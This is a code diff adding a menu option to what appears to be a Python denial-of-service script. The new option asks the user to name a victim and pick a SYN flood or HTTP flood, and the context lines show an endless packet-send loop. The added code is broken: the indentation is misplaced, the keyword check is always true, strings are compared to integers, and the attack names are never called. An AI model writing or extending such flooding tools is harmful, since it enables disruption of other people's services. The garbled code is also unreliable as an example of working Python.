@@ -182,5 +182,21 @@ def main():
             counter+=1
             while(1):
                 send(fragment)
+elif options == 8:
+name = input("Whats your name?: ")
+print("nice to meet you " + name)
+aaa = input("How can i help you today?: ")
+if "ddos" or "dos" or "DDoS" or "DoS" or "Dos" or "Ddos" in aaa:
+	victim = input("Who you want me to DoS?: ")
+	print("Ok, i'm gonna DoS " + victim)
+	time.sleep(2)
+	print("[Menu]")
+	ccc = input("What DoS attacck do you want me to do? (insert number): ")
+	if ccc == 1:
+		synflood
+	elif ccc == 2:
+		httpflood
+	
+	
 if __name__ == "__main__":
     main()
